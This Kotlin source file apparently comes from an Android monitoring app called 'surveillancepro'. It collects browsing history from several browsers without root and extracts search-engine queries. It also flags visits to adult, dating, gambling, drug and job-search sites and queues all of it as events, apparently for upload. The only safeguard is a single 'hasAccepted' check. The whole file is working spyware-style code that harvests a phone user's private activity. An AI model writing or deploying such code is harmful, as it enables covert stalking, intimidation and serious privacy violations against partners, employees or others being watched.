package com.surveillancepro.android.services

import android.content.Context
import android.database.Cursor
import android.net.Uri
import android.util.Log
import com.surveillancepro.android.data.DeviceStorage
import com.surveillancepro.android.data.EventQueue
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

/**
 * Capture de l'historique de navigation - SANS ROOT
 * 
 * MÉTHODE:
 * - Chrome: ContentProvider (android.provider.Browser)
 * - Samsung Internet: ContentProvider
 * - Firefox: Fichier SQLite (nécessite permission stockage)
 * 
 * DONNÉES CAPTURÉES:
 * - URL visitée
 * - Titre de la page
 * - Date/heure de visite
 * - Nombre de visites
 * - Recherches effectuées
 */
object BrowserHistoryCapture {
    
    private const val TAG = "BrowserHistory"
    
    // URIs des ContentProviders des navigateurs
    private val CHROME_HISTORY_URI = Uri.parse("content://com.android.chrome.browser/bookmarks")
    private val BROWSER_HISTORY_URI = Uri.parse("content://browser/bookmarks")
    private val SAMSUNG_HISTORY_URI = Uri.parse("content://com.sec.android.app.sbrowser.browser/bookmarks")
    
    // Dernière synchronisation
    private var lastSyncTime = 0L
    
    private val dateFormat = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US)
    
    /**
     * Capture l'historique de tous les navigateurs disponibles.
     */
    fun captureHistory(context: Context) {
        val storage = DeviceStorage.getInstance(context)
        if (!storage.hasAccepted) return
        
        val queue = EventQueue.getInstance(context)
        val allHistory = mutableListOf<BrowserEntry>()
        
        // Essayer Chrome
        try {
            val chromeHistory = queryBrowserHistory(context, CHROME_HISTORY_URI, "Chrome")
            allHistory.addAll(chromeHistory)
        } catch (e: Exception) {
            Log.w(TAG, "Chrome history not accessible: ${e.message}")
        }
        
        // Essayer le navigateur par défaut Android
        try {
            val browserHistory = queryBrowserHistory(context, BROWSER_HISTORY_URI, "Browser")
            allHistory.addAll(browserHistory)
        } catch (e: Exception) {
            Log.w(TAG, "Default browser history not accessible: ${e.message}")
        }
        
        // Essayer Samsung Internet
        try {
            val samsungHistory = queryBrowserHistory(context, SAMSUNG_HISTORY_URI, "Samsung")
            allHistory.addAll(samsungHistory)
        } catch (e: Exception) {
            Log.w(TAG, "Samsung browser history not accessible: ${e.message}")
        }
        
        // Filtrer les entrées depuis la dernière sync
        val newEntries = allHistory.filter { it.visitTime > lastSyncTime }
        
        if (newEntries.isNotEmpty()) {
            // Envoyer l'historique par lots
            val batches = newEntries.chunked(50)
            for (batch in batches) {
                queue.enqueue("browser_history", mapOf(
                    "entries" to batch.map { entry ->
                        mapOf(
                            "url" to entry.url,
                            "title" to entry.title,
                            "browser" to entry.browser,
                            "visitTime" to dateFormat.format(Date(entry.visitTime)),
                            "visits" to entry.visits,
                            "isBookmark" to entry.isBookmark,
                        )
                    },
                    "count" to batch.size,
                    "timestamp" to dateFormat.format(Date()),
                ))
            }
            
            Log.d(TAG, "Captured ${newEntries.size} new browser history entries")
        }
        
        lastSyncTime = System.currentTimeMillis()
    }
    
    /**
     * Interroge le ContentProvider d'un navigateur.
     */
    private fun queryBrowserHistory(context: Context, uri: Uri, browserName: String): List<BrowserEntry> {
        val entries = mutableListOf<BrowserEntry>()
        
        val projection = arrayOf(
            "_id",
            "url",
            "title",
            "visits",
            "date",
            "bookmark"
        )
        
        var cursor: Cursor? = null
        try {
            cursor = context.contentResolver.query(
                uri,
                projection,
                "bookmark = 0", // Seulement l'historique, pas les favoris
                null,
                "date DESC"
            )
            
            cursor?.let {
                val urlIndex = it.getColumnIndex("url")
                val titleIndex = it.getColumnIndex("title")
                val visitsIndex = it.getColumnIndex("visits")
                val dateIndex = it.getColumnIndex("date")
                val bookmarkIndex = it.getColumnIndex("bookmark")
                
                while (it.moveToNext() && entries.size < 500) { // Max 500 entrées
                    val url = if (urlIndex >= 0) it.getString(urlIndex) else null
                    val title = if (titleIndex >= 0) it.getString(titleIndex) else null
                    val visits = if (visitsIndex >= 0) it.getInt(visitsIndex) else 1
                    val date = if (dateIndex >= 0) it.getLong(dateIndex) else 0
                    val isBookmark = if (bookmarkIndex >= 0) it.getInt(bookmarkIndex) == 1 else false
                    
                    if (!url.isNullOrBlank()) {
                        entries.add(BrowserEntry(
                            url = url,
                            title = title ?: "",
                            browser = browserName,
                            visitTime = date,
                            visits = visits,
                            isBookmark = isBookmark,
                        ))
                    }
                }
            }
        } finally {
            cursor?.close()
        }
        
        return entries
    }
    
    /**
     * Capture les recherches Google depuis l'historique.
     */
    fun extractSearchQueries(context: Context) {
        val storage = DeviceStorage.getInstance(context)
        if (!storage.hasAccepted) return
        
        val queue = EventQueue.getInstance(context)
        
        // Patterns de recherche
        val searchPatterns = listOf(
            Regex("google\\.com/search\\?.*q=([^&]+)"),
            Regex("bing\\.com/search\\?.*q=([^&]+)"),
            Regex("duckduckgo\\.com/\\?.*q=([^&]+)"),
            Regex("yahoo\\.com/search.*p=([^&]+)"),
            Regex("youtube\\.com/results\\?.*search_query=([^&]+)"),
        )
        
        // Récupérer l'historique récent
        val allHistory = mutableListOf<BrowserEntry>()
        try {
            allHistory.addAll(queryBrowserHistory(context, CHROME_HISTORY_URI, "Chrome"))
        } catch (_: Exception) {}
        try {
            allHistory.addAll(queryBrowserHistory(context, BROWSER_HISTORY_URI, "Browser"))
        } catch (_: Exception) {}
        
        val searches = mutableListOf<Map<String, Any>>()
        
        for (entry in allHistory) {
            for (pattern in searchPatterns) {
                val match = pattern.find(entry.url)
                if (match != null) {
                    val query = java.net.URLDecoder.decode(match.groupValues[1], "UTF-8")
                    searches.add(mapOf(
                        "query" to query,
                        "engine" to when {
                            entry.url.contains("google") -> "Google"
                            entry.url.contains("bing") -> "Bing"
                            entry.url.contains("duckduckgo") -> "DuckDuckGo"
                            entry.url.contains("yahoo") -> "Yahoo"
                            entry.url.contains("youtube") -> "YouTube"
                            else -> "Unknown"
                        },
                        "timestamp" to dateFormat.format(Date(entry.visitTime)),
                        "browser" to entry.browser,
                    ))
                    break
                }
            }
        }
        
        if (searches.isNotEmpty()) {
            queue.enqueue("search_queries", mapOf(
                "searches" to searches.take(100), // Max 100 recherches
                "count" to searches.size,
                "timestamp" to dateFormat.format(Date()),
            ))
            
            Log.d(TAG, "Extracted ${searches.size} search queries")
        }
    }
    
    /**
     * Détecte les sites sensibles visités.
     */
    fun detectSensitiveSites(context: Context) {
        val storage = DeviceStorage.getInstance(context)
        if (!storage.hasAccepted) return
        
        val queue = EventQueue.getInstance(context)
        
        // Catégories de sites sensibles
        val sensitiveDomains = mapOf(
            "adult" to listOf("pornhub", "xvideos", "xhamster", "onlyfans", "chaturbate"),
            "dating" to listOf("tinder", "bumble", "badoo", "meetic", "adopte"),
            "gambling" to listOf("bet365", "winamax", "pokerstars", "unibet", "betclic"),
            "drugs" to listOf("silkroad", "darknet", "tor"),
            "job_search" to listOf("indeed", "linkedin/jobs", "monster", "glassdoor"),
        )
        
        val allHistory = mutableListOf<BrowserEntry>()
        try {
            allHistory.addAll(queryBrowserHistory(context, CHROME_HISTORY_URI, "Chrome"))
        } catch (_: Exception) {}
        
        val sensitiveVisits = mutableListOf<Map<String, Any>>()
        
        for (entry in allHistory) {
            val urlLower = entry.url.lowercase()
            for ((category, domains) in sensitiveDomains) {
                if (domains.any { urlLower.contains(it) }) {
                    sensitiveVisits.add(mapOf(
                        "url" to entry.url,
                        "title" to entry.title,
                        "category" to category,
                        "timestamp" to dateFormat.format(Date(entry.visitTime)),
                    ))
                    break
                }
            }
        }
        
        if (sensitiveVisits.isNotEmpty()) {
            queue.enqueue("sensitive_sites_detected", mapOf(
                "visits" to sensitiveVisits,
                "count" to sensitiveVisits.size,
                "timestamp" to dateFormat.format(Date()),
                "severity" to "warning",
            ))
            
            Log.d(TAG, "Detected ${sensitiveVisits.size} sensitive site visits")
        }
    }
    
    data class BrowserEntry(
        val url: String,
        val title: String,
        val browser: String,
        val visitTime: Long,
        val visits: Int,
        val isBookmark: Boolean,
    )
}
